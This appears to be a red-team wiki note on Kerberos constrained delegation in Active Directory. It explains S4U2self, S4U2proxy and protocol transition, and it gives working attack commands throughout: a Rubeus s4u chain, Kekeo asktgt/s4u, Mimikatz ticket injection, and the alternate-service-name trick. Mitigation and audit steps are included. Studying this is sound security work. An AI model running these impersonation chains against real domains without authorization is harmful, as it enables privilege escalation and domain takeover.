---
title: Constrained Delegation
aliases: ["Constrained Delegation", "S4U2self", "S4U2proxy", "S4U", "TRUSTED_TO_AUTH_FOR_DELEGATION", "Protocol Transition"]
type: concept
domain: [active-directory]
tags: [type/concept, domain/active-directory, proto/kerberos, attack/privesc]
source:
  - "[[Source - zer1t0 - Attacking Active Directory]]"
  - "[[Source - harmj0y blog]]"
  - "[[Source - hackndo blog]]"
source_url: "https://zer1t0.gitlab.io/posts/attacking_ad/"
verified: true
related: ["[[Kerberos Delegation]]", "[[Unconstrained Delegation]]", "[[Resource-Based Constrained Delegation (RBCD)]]", "[[UserAccountControl]]", "[[Service Principal Name (SPN)]]"]
created: 2026-06-06
updated: 2026-06-07
---

# Constrained Delegation

> [!summary] One-liner
> A service may impersonate users only to specific SPNs (msDS-AllowedToDelegateTo), using the S4U extensions — but the impersonation can be abused to fully own the target host.

## How it works
The service account has **`TRUSTED_TO_AUTH_FOR_DELEGATION`** and a list of allowed targets in **`msDS-AllowedToDelegateTo`**. Two Kerberos extensions:
- **S4U2self** — the service gets an ST **to itself, on behalf of any user** (protocol transition — even users who never used Kerberos).
- **S4U2proxy** — exchanges that ST for an ST **to an allowed target SPN**, still as the impersonated user.

## The attack
If you control a service account configured for constrained delegation:
1. **S4U2self** to impersonate a privileged user (e.g. Administrator) to yourself.
2. **S4U2proxy** to get an ST to an **allowed target SPN** as that admin.

```powershell
# Rubeus - full S4U chain, impersonate a target user toward an allowed SPN
Rubeus.exe s4u /user:websvc$ /rc4:<hash> /impersonateuser:Administrator /msdsspn:cifs/db.contoso.local /ptt
```

> [!warning] Alternate-service-name trick
> The target service name in the returned ST isn't cryptographically bound to a single service — you can swap `cifs` for `host`, `ldap`, etc. on the **same host**, so "delegate to TIME/host" can become **CIFS/LDAP on that host** → effectively full host takeover. If you can delegate to a **DC**, that's domain compromise.

## Why a red teamer cares
Constrained delegation looks "limited" but the alternate-service-name behavior often makes it a full compromise of the target machine.

## More from harmj0y (S4U2Pwnage — abuse mechanics & weaponization)

### Mechanism details
- **S4U2self** requests "a special forwardable service ticket to itself on behalf of a particular user" **without needing that user's password**. The request carries the user identity in the **PA-FOR-USER** structure inside pre-authentication data (rather than a TGT).
- **S4U2proxy** then takes that forwardable ticket and requests a service ticket to one of the SPNs in the account's **`msDS-AllowedToDelegateTo`** list, while impersonating the chosen user.
- **Protocol Transition**: a service can authenticate a user with a non-Kerberos method and then "transition" that authentication into Kerberos via S4U2self.
- The **PAC in the S4U2self response is signed for the source (the service) user, not the target user** — this is why S4U2self cannot be turned into a universal Kerberoasting primitive. S4U2proxy validates the requested SPN against `msDS-AllowedToDelegateTo` before issuing tickets, enforcing the "constrained" limit.

### Enumeration (PowerView)
```powershell
# Find user/computer accounts trusted for constrained delegation
Get-DomainUser -TrustedToAuth
Get-DomainComputer -TrustedToAuth
# (Targets are accounts with a non-null msDS-AllowedToDelegateTo field)
```

### Attack scenario 1 — controlled user account + plaintext password (Kekeo)
```text
# 1) Request a TGT for the delegation-trusted account
asktgt.exe /user:<USERNAME> /password:<PASSWORD> /domain:<DOMAIN>

# 2) Run the S4U2self + S4U2proxy chain, impersonating a target user toward an allowed SPN
s4u.exe /tgt:<ticket.kirbi> /user:<TARGET>@<DOMAIN> /impersonate /mspn:<SPN>

# 3) Inject the resulting ticket (Mimikatz)
kerberos::ptt <ticket.kirbi>
```

### Attack scenario 2 — computer account compromised, running as SYSTEM
When you already run as **SYSTEM** on a host whose machine account is trusted for delegation, you can trigger S4U2proxy through .NET `WindowsIdentity` impersonation (requires **SeTcbPrivilege**, which SYSTEM has by default; PowerShell v2 needs `-sta`):
```powershell
$Ident   = New-Object System.Security.Principal.WindowsIdentity @('Administrator@TESTLAB.LOCAL')
$Context = $Ident.Impersonate()
ls \\PRIMARY.TESTLAB.LOCAL\C$
$Context.Undo()
```

### Attack scenarios 3 & 4 — hash-based (no plaintext)
Substitute the NTLM hash for the password in `asktgt.exe`; works for user and computer accounts:
```text
asktgt.exe /user:<USERNAME> /key:<NTLM_HASH> /domain:<DOMAIN>
asktgt.exe /user:<MACHINE$> /key:<NTLM_HASH> /domain:<DOMAIN>
```

### Impact by target SPN
Because of the alternate-service-name trick, the SPN you land on dictates the payoff:
- **HOST** → complete remote host takeover
- **MSSQLSvc** → DBA rights on the SQL instance
- **CIFS** → remote file access
- **HTTP** → web service takeover
- **LDAP** → **DCSync** capability (see [[DCSync]])

### Mitigation / defense (from harmj0y)
- Set **"Account is sensitive and cannot be delegated"** (the **`NOT_DELEGATED`** userAccountControl flag) on privileged users. This prevents their security context from ever being delegated, even when a service account is configured for constrained delegation. (Also achieved via the **Protected Users** group.)
- Audit accounts allowing/disallowing delegation:
```powershell
Get-DomainUser -AllowDelegation       # accounts whose context CAN be delegated
Get-DomainUser -DisallowDelegation    # accounts marked sensitive / not-delegated
ConvertFrom-UACValue <uac>            # decode userAccountControl flags
```

### Tools referenced
- **Kekeo**: `asktgt.exe`, `s4u.exe`, `tgs.exe`
- **Mimikatz**: `kerberos::ptt` (ticket injection)
- **PowerView**: `Get-DomainUser`, `Get-DomainComputer`, `ConvertFrom-UACValue`
- **Rubeus**: modern weaponization of the same S4U chain (see block above)

## Protocol Transition detail (hackndo)
Two distinct constrained delegation modes exist, determined by the `TRUSTED_TO_AUTHENTICATE_FOR_DELEGATION` flag on the service account:

### 1. Kerberos-only (flag NOT set)
The service can only relay **existing Kerberos authentication** via S4U2Proxy. S4U2Self still works, but the returned ticket is **non-forwardable**. When this non-forwardable ticket is presented to S4U2Proxy, the KDC **rejects** it. The service can only delegate users who have already authenticated to it via Kerberos (i.e. the service already holds a forwardable TGS from the user's own authentication).

### 2. Any protocol (flag IS set — "Protocol Transition")
The service can impersonate **any user** via S4U2Self **regardless of how they originally authenticated** (NTLM, form-based, certificate, etc.). S4U2Self returns a **forwardable** ticket, which S4U2Proxy accepts. This is "protocol transition" — the service transitions a non-Kerberos authentication into a Kerberos security context.

> [!danger] Security implication (hackndo)
> "If such an account is compromised, then all services to which that account is entitled to authenticate via delegation will also be compromised, since the attacker can create service tickets on behalf of arbitrary users, such as administrators."

This distinction is critical for attackers: compromising a constrained delegation account with `TRUSTED_TO_AUTHENTICATE_FOR_DELEGATION` is far more powerful than one without it, because the former allows impersonation of **any user** (including those who never authenticated to the service), while the latter is limited to relaying existing Kerberos sessions. RBCD ([[Resource-Based Constrained Delegation (RBCD)]]) sidesteps this restriction entirely by accepting non-forwardable tickets.

## Sources
- [[Source - zer1t0 - Attacking Active Directory]] — "Kerberos Constrained Delegation" (S4U2self / S4U2proxy / S4U attacks)
- [[Source - harmj0y blog]] — "S4U2Pwnage" — https://blog.harmj0y.net/activedirectory/s4u2pwnage/
- [[Source - hackndo blog]] — Constrained Delegation — protocol transition modes and security implications
